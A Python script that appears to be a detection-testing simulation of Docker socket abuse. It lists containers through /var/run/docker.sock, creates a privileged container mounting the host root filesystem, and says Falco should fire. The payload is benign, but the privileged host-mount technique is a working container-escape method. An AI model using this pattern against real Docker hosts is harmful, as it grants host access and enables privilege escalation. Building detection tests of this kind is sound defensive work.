import json
import requests_unixsocket


SOCK_BASE = "http+unix://%2Fvar%2Frun%2Fdocker.sock"


def run_attack() -> None:
    session = requests_unixsocket.Session()

    print("[SOCK] Docker Socket Abuse Simulation")
    print("[SOCK] Enumerating containers via Docker API...")

    resp = session.get(f"{SOCK_BASE}/containers/json?all=true", timeout=5)
    containers = resp.json()
    for c in containers:
        print(f"[SOCK][!] Container: {c.get('Names')} | Image: {c.get('Image')} | State: {c.get('State')}")

    print("[SOCK] Attempting to create privileged sibling container with host mount...")
    payload = {
        "Image": "alpine",
        "Cmd": ["sh", "-c", "hostname && cat /host/etc/hostname 2>/dev/null || echo 'host mount ok'"],
        "HostConfig": {
            "Binds": ["/:/host:ro"],
            "Privileged": True,
        },
        "Labels": {"spawned_by": "attacker-sock", "scenario": "docker-socket-abuse"},
    }

    resp = session.post(
        f"{SOCK_BASE}/containers/create?name=attacker-spawned",
        data=json.dumps(payload),
        headers={"Content-Type": "application/json"},
        timeout=5,
    )

    if resp.status_code in (201, 409):
        print(f"[SOCK][!] SUCCESS: Privileged container created via docker.sock (status {resp.status_code})")
    else:
        print(f"[SOCK][-] Response {resp.status_code}: {resp.text[:200]}")

    print("[SOCK] Attack simulation complete — Falco should have fired on docker socket write")
